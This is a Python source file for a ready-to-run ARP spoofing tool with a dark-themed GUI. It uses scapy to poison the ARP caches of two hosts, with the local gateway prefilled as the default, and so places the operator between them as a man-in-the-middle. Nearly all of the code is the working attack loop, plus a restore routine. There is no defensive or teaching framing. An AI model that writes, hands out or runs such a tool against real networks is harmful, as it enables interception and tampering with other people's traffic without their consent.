from customtkinter import CTk, CTkButton, CTkLabel, CTkEntry, CTkTextbox, CTkFrame, DISABLED, NORMAL, END, set_default_color_theme, set_appearance_mode
from threading import Thread
from scapy.all import Ether, ARP, srp, sendp, conf
from keyboard import is_pressed
from time import sleep


def arp_spoofer_gui():

    def adding(txt):
        res_box.configure(state=NORMAL)
        res_box.insert(END, str(txt)+'\n')
        res_box.configure(state=DISABLED)

    def attack_btn():
        def attack():
            adding('[+]    SPOOFING STARTED !')
            global stat
            stat = 'TRUE'
            first_ip = first_host_entry.get()
            second_ip = second_host_entry.get()
            interface = interface_entry.get()

            def getmac(ip): # get mac by ip with arp protocol
                try:
                    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
                    result = srp(packet , timeout=3, verbose=0)
                    return result[0][0][1].hwsrc
                except Exception:
                    adding(txt="[ ! ]    ERROR")
            def spoof(target_ip , spoof_ip):
                try:
                    target_mac = getmac(target_ip) # ARP -> IP 2 MAC
                    # gtxt(f'Target mac :{target_mac}')
                    packet = Ether(dst = target_mac) / ARP(psrc=spoof_ip , pdst=target_ip,hwdst = target_mac , op = "is-at")
                    try:
                        sendp(packet , verbose = 0)
                        return True
                    except :
                        return False
                except Exception as er:
                    print(er)
                    adding("[ ! ]    ERROR [WHILE SPOOFING]")

            def inj():
                target_ip = first_ip
                spoof_ip = second_ip
                try:
                    spoof(target_ip , spoof_ip)
                    spoof(spoof_ip , target_ip)
                    adding("[+]    SUCCESSFULY STARTED TO INJECT \n          EACH 60 SECONDS ! \n          hold q for 6 seconds to break loop")
                    while True:
                        if stat == 'TRUE':
                            spoof(target_ip , spoof_ip)
                            spoof(spoof_ip , target_ip)
                            adding(f'-----------------------\n[+]    SPOOFED\n-----------------------')
                            sleep(5)
                            if is_pressed('q'):
                                adding('[~]    SPOOFING STOPED !')
                                break
                        if stat == 'FALSE' :
                            break
                except Exception:
                    adding('[ ! ]    ERROR OCCURRED !')

            def arp_spoofing_runner():
                try:
                    conf.iface = interface
                    inj()

                except Exception:
                    adding("[ ! ]    ERROR OCCURRED !")
            arp_spoofing_runner()
        Thread(target=attack).start()



    def restored_btn():
        def restore_func():
            global stat
            stat = 'FALSE'
            adding('[~]    RESTORING TO DEFAULT ...')
            first_ip = first_host_entry.get()
            second_ip = second_host_entry.get()
            interface = interface_entry.get()

            def getmac(ip): # get mac by ip with arp protocol
                try:
                    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
                    result = srp(packet , timeout=3, verbose=0)
                    return result[0][0][1].hwsrc
                except Exception:
                    adding(txt="[ ! ]    ERROR")

            def restore():
                try:
                    target_ip = first_ip
                    spoof_ip = second_ip

                    def res(target_ip, spoof_ip):
                        target_mac = getmac(target_ip)
                        spoof_mac = getmac(spoof_ip)
                        packet = Ether(dst = target_mac) / ARP(psrc = spoof_ip ,pdst = target_ip ,hwsrc = spoof_mac ,hwdst = target_mac ,op = "is-at")
                        sendp(packet , verbose = 0)
                    
                    res(target_ip, spoof_ip)
                    res(spoof_ip, target_ip)
                    sleep(1)
                    adding('[!]    RESTORED RO DEFAULT !')

                except Exception:
                    adding("[ ! ]    ERROR")

            def arp_spoofing_runner():
                try:
                    conf.iface = interface
                    restore()

                except Exception:
                    adding("[ ! ]    ERROR OCCURRED !")
            arp_spoofing_runner()
        Thread(target=restore_func).start()

    def clear_log():
        def clear():
            res_box.configure(state=NORMAL)
            res_box.delete(1.0, END)
            res_box.configure(state=DISABLED)
        Thread(target=clear).start()


    root = CTk()
    root.title('ARP SPOOFING')
    root.geometry('700x620')
    root.resizable(False, False)
    set_appearance_mode("dark")
    set_default_color_theme("blue")
    frame = CTkFrame(master=root, corner_radius=10, border_width=2, border_color='red')
    frame.pack(padx=20, pady=20, fill='both', expand=True)
    # --------------------------------------------------------
    title = CTkLabel(frame, text='ARP SPOOFING', font=('montserrat', 30, 'bold'))

    first_host_lbl = CTkLabel(master=frame, text='FIRST HOST : ', font=('montserrat', 25, 'bold'))
    first_host_entry = CTkEntry(frame, width=240, height=37, font=('montserrat', 25), placeholder_text='fist host')
    second_host_lbl = CTkLabel(master=frame, text='SECOND HOST : ', font=('montserrat', 25, 'bold'))
    second_host_entry = CTkEntry(frame, width=240, height=37, font=('montserrat', 25), placeholder_text='second host')
    interface_lbl = CTkLabel(master=frame, text='INTERFACE :', font=('montserrat', 25, 'bold'))
    interface_entry = CTkEntry(frame, width=240, height=37, font=('montserrat', 25), placeholder_text='number')
    attack_button  = CTkButton(frame, text='ATTACK',width=240, height=40, font=('montserrat', 25), command=attack_btn)
    restore_button  = CTkButton(frame, text='RESTORE',width=240, height=40, font=('montserrat', 25), command=restored_btn)
    res_box = CTkTextbox(frame, width=531, height=150, font=('montserrat', 17), border_color='white', border_width=2)
    clear_log_button  = CTkButton(frame, text='CLEAR LOG',width=531, height=40, font=('montserrat', 25), command=clear_log, fg_color='red', hover_color='#A80000')
    close_button  = CTkButton(frame, text='CLOSE',width=531, height=40, font=('montserrat', 25, 'bold'), command=lambda: root.destroy(), fg_color='red', hover_color='#A80000')


    second_host_entry.insert(END, '192.168.1.1')
    interface_entry.insert(END, 'Wi-Fi')
    res_box.configure(state=DISABLED)


    title.place(x=190, y=20)
    first_host_lbl.place(x=65, y=100)
    first_host_entry.place(x=355 ,y=100)
    second_host_lbl.place(x=65, y=150)
    second_host_entry.place(x=355 ,y=150)
    interface_lbl.place(x=65, y=200)
    interface_entry.place(x=355 ,y=200)
    attack_button.place(x=65, y=250)
    restore_button.place(x=355, y=250)
    res_box.place(x=65, y=310)
    clear_log_button.place(x=65, y=475)
    close_button.place(x=65, y=525)


    root.mainloop()


if __name__ == '__main__' :
    arp_spoofer_gui()